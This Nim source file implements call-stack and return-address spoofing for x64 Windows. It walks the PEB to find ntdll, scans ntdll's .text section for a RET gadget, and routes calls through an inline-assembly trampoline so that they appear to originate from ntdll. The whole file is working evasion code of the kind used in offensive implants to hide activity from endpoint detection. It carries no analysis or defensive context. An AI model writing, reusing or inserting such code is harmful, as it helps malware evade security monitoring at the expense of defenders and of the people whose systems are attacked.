# spoof.nim — Return address / call stack spoofing
#
# Trampoline-based stack spoof so that syscall-intensive operations appear to
# originate from a benign call site (e.g. ntdll itself).

var gGadgetAddr*: uint = 0

proc findRetGadget(): uint =
  # unsafe — PEB walk to ntdll, scan .text for 0xC3 RET
  var peb: uint
  {.emit: """__asm__ volatile ("mov %0, qword ptr gs:[0x60]" : "=r"(`peb`));""".}
  let ldr   = cast[ptr uint](peb + 0x18)[]
  var e     = cast[ptr uint](ldr + 0x10)[]
  e = cast[ptr uint](e)[]  # [0] exe
  e = cast[ptr uint](e)[]  # [1] ntdll
  let base  = cast[ptr uint](e + 0x30)[]

  let peOff   = uint(cast[ptr uint32](base + 0x3C)[])
  let nt      = base + peOff
  let numSec  = int(cast[ptr uint16](nt + 0x06)[])
  let optSize = uint(cast[ptr uint16](nt + 0x14)[])
  let secBase = nt + 0x18 + optSize

  for i in 0 ..< numSec:
    let sec      = secBase + uint(i) * 0x28
    let name     = cast[ptr array[8, byte]](sec)
    if name[][0] != byte('.') or name[][1] != byte('t') or
       name[][2] != byte('e') or name[][3] != byte('x') or
       name[][4] != byte('t'):
      continue
    let virtAddr = uint(cast[ptr uint32](sec + 0x0C)[])
    let virtSize = uint(cast[ptr uint32](sec + 0x08)[])
    let textStart = base + virtAddr
    for off in 4 ..< int(virtSize) - 1:
      if cast[ptr byte](textStart + uint(off))[] == 0xC3'u8:
        return textStart + uint(off)
  0

proc initGadget*() =
  # unsafe
  let a = findRetGadget()
  if a != 0:
    gGadgetAddr = a

# Spoof gate — naked function, GCC inline asm
# Calling convention on entry:
#   RSP+0x00 = real return address (pushed by `call spoof_gate`)
#   R10      = target function pointer
#   RCX/RDX/R8/R9 = args 0-3
proc spoofGate() {.asmNoStackFrame.} =
  {.emit: """
    __asm__(
      "mov rax, [rsp]\n\t"
      "lea r11, [rip + `gGadgetAddr`]\n\t"
      "mov r11, [r11]\n\t"
      "mov [rsp], r11\n\t"
      "push rax\n\t"
      "jmp r10\n\t"
    );
  """.}

proc spoofStack*(
  target: pointer,
  arg0, arg1, arg2, arg3: uint,
): int =
  # unsafe
  if gGadgetAddr == 0:
    # Fallback: direct call, no spoof
    let fn = cast[proc(a, b, c, d: uint): int {.stdcall.}](target)
    return fn(arg0, arg1, arg2, arg3)

  var result: int
  {.emit: """
    register NIM_ULONGLONG rcx_val __asm__("rcx") = `arg0`;
    register NIM_ULONGLONG rdx_val __asm__("rdx") = `arg1`;
    register NIM_ULONGLONG r8_val  __asm__("r8")  = `arg2`;
    register NIM_ULONGLONG r9_val  __asm__("r9")  = `arg3`;
    register NIM_ULONGLONG r10_val __asm__("r10") = (NIM_ULONGLONG)`target`;
    __asm__ volatile (
      "call %[gate]"
      : "=a" (`result`)
      : [gate] "r" (`spoofGate`),
        "r" (rcx_val), "r" (rdx_val), "r" (r8_val), "r" (r9_val), "r" (r10_val)
      : "r11", "memory"
    );
  """.}
  result
